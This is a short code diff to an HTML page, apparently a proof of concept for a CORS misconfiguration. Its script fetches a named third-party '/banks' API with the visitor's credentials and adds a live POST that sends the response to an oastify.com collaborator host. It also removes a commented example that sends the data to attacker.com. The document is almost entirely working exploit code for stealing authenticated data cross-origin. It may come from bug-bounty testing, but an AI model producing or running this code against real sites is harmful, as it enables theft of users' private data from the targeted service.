@@ -3,14 +3,18 @@
   <body>
     <script>
       fetch("https://jahad-api.barakatfoundation.com/banks", {
-        credentials: "include"
+        credentials: "include",
+        mode: "cors"
       })
       .then(res => res.text())
       .then(data => {
         console.log("Data:", data);
-        // Optionally send to your server
-        // fetch('https://attacker.com/log', {method:'POST', body:data})
-      });
+        fetch("https://13270cbgfxqsqyx57aa9jey990fs3ir7.oastify.com/log", {
+          method: "POST",
+          body: data
+        });
+      })
+      .catch(err => console.error("Error:", err));
     </script>
   </body>
 </html>
